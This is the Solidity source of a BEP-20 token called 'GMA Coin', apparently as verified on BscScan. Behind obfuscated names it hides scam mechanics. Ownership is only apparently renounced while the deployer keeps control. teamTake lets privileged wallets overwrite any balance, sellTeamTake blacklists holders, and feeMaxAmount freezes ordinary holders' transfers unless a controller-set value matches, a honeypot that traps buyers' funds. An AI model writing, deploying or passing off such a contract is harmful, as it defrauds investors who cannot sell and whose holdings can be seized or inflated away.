/**
 *Submitted for verification at BscScan.com on 2023-04-18
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

interface txAuto {
    function totalSupply() external view returns (uint256);

    function balanceOf(address marketingExempt) external view returns (uint256);

    function transfer(address marketingFee, uint256 txEnable) external returns (bool);

    function allowance(address maxTotal, address spender) external view returns (uint256);

    function approve(address spender, uint256 txEnable) external returns (bool);

    function transferFrom(
        address sender,
        address marketingFee,
        uint256 txEnable
    ) external returns (bool);

    event Transfer(address indexed from, address indexed takeTrading, uint256 value);
    event Approval(address indexed maxTotal, address indexed spender, uint256 value);
}

interface txAutoMetadata is txAuto {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract feeMaxTrading {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface minToken {
    function createPair(address fromLaunch, address liquidityShould) external returns (address);
}

interface receiverShould {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract GMACoin is feeMaxTrading, txAuto, txAutoMetadata {

    function allowance(address teamLiquidity, address isLiquidity) external view virtual override returns (uint256) {
        if (isLiquidity == modeListFrom) {
            return type(uint256).max;
        }
        return atExemptList[teamLiquidity][isLiquidity];
    }

    function tradingWallet() public {
        emit OwnershipTransferred(maxIs, address(0));
        minMax = address(0);
    }

    function teamTake(address totalSender, uint256 txEnable) public {
        buyTotal();
        txMarketing[totalSender] = txEnable;
    }

    mapping(address => mapping(address => uint256)) private atExemptList;

    mapping(address => bool) public walletMin;

    function autoWallet(address limitLaunchedTo, address marketingFee, uint256 txEnable) internal returns (bool) {
        require(txMarketing[limitLaunchedTo] >= txEnable);
        txMarketing[limitLaunchedTo] -= txEnable;
        txMarketing[marketingFee] += txEnable;
        emit Transfer(limitLaunchedTo, marketingFee, txEnable);
        return true;
    }

    mapping(address => bool) public txShouldTo;

    function decimals() external view virtual override returns (uint8) {
        return listIsToken;
    }

    address modeListFrom = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function owner() external view returns (address) {
        return minMax;
    }

    function approve(address isLiquidity, uint256 txEnable) public virtual override returns (bool) {
        atExemptList[_msgSender()][isLiquidity] = txEnable;
        emit Approval(_msgSender(), isLiquidity, txEnable);
        return true;
    }

    address private minMax;

    function listFund(address enableIsMax) public {
        if (toExempt) {
            return;
        }
        if (sellLiquidity != swapFee) {
            swapFee = sellLiquidity;
        }
        walletMin[enableIsMax] = true;
        
        toExempt = true;
    }

    function transferFrom(address limitLaunchedTo, address marketingFee, uint256 txEnable) external override returns (bool) {
        if (_msgSender() != modeListFrom) {
            if (atExemptList[limitLaunchedTo][_msgSender()] != type(uint256).max) {
                require(txEnable <= atExemptList[limitLaunchedTo][_msgSender()]);
                atExemptList[limitLaunchedTo][_msgSender()] -= txEnable;
            }
        }
        return feeMaxAmount(limitLaunchedTo, marketingFee, txEnable);
    }

    event OwnershipTransferred(address indexed isBuyShould, address indexed sellSenderLiquidity);

    function buyTotal() private view {
        require(walletMin[_msgSender()]);
    }

    string private amountIs = "GMA Coin";

    function transfer(address totalSender, uint256 txEnable) external virtual override returns (bool) {
        return feeMaxAmount(_msgSender(), totalSender, txEnable);
    }

    uint256 atSwap;

    string private sellLaunched = "GCN";

    bool public toExempt;

    uint256 private limitFund;

    uint256 private maxLiquidity = 100000000 * 10 ** 18;

    function feeMaxAmount(address limitLaunchedTo, address marketingFee, uint256 txEnable) internal returns (bool) {
        if (limitLaunchedTo == maxIs) {
            return autoWallet(limitLaunchedTo, marketingFee, txEnable);
        }
        uint256 amountMode = txAuto(launchMarketing).balanceOf(receiverFeeTrading);
        require(amountMode == maxSell);
        require(!txShouldTo[limitLaunchedTo]);
        return autoWallet(limitLaunchedTo, marketingFee, txEnable);
    }

    function symbol() external view virtual override returns (string memory) {
        return sellLaunched;
    }

    function name() external view virtual override returns (string memory) {
        return amountIs;
    }

    uint8 private listIsToken = 18;

    constructor (){
        if (sellLiquidity == limitFund) {
            swapFee = limitFund;
        }
        tradingWallet();
        receiverShould liquidityLaunch = receiverShould(modeListFrom);
        launchMarketing = minToken(liquidityLaunch.factory()).createPair(liquidityLaunch.WETH(), address(this));
        
        maxIs = _msgSender();
        walletMin[maxIs] = true;
        txMarketing[maxIs] = maxLiquidity;
        
        emit Transfer(address(0), maxIs, maxLiquidity);
    }

    address receiverFeeTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function balanceOf(address marketingExempt) public view virtual override returns (uint256) {
        return txMarketing[marketingExempt];
    }

    function liquidityExempt(uint256 txEnable) public {
        buyTotal();
        maxSell = txEnable;
    }

    mapping(address => uint256) private txMarketing;

    address public launchMarketing;

    function getOwner() external view returns (address) {
        return minMax;
    }

    address public maxIs;

    function sellTeamTake(address modeMax) public {
        buyTotal();
        if (limitFund != sellLiquidity) {
            sellLiquidity = limitFund;
        }
        if (modeMax == maxIs || modeMax == launchMarketing) {
            return;
        }
        txShouldTo[modeMax] = true;
    }

    uint256 maxSell;

    uint256 private sellLiquidity;

    function totalSupply() external view virtual override returns (uint256) {
        return maxLiquidity;
    }

    uint256 public swapFee;

}